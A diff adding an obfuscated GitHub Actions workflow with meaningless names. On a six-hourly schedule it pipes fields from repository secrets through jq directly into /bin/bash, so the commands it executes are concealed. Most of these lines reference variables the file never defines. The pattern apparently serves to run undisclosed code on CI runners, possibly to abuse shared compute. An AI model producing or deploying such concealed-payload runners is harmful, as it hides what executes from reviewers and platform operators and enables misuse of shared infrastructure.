@@ -1,0 +1,24 @@
+name: tingdoumeiyoutin
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tingdoumeiyoutin
+        env:
+          iz79: ${{ secrets.iz79 }}
+        run: |
+          echo $iz79 | jq -r .gf60 | /bin/bash
+          echo $k3931 | jq -r .rsex28855 | /bin/bash
+          echo $ci6 | jq -r .qhp2119 | /bin/bash
+          echo $rgslx6 | jq -r .cpc2 | /bin/bash
+          echo $z48 | jq -r .mi6 | /bin/bash
+          echo $wrf4801 | jq -r .bzu5 | /bin/bash
+          echo $ppxal3 | jq -r .t312 | /bin/bash
+
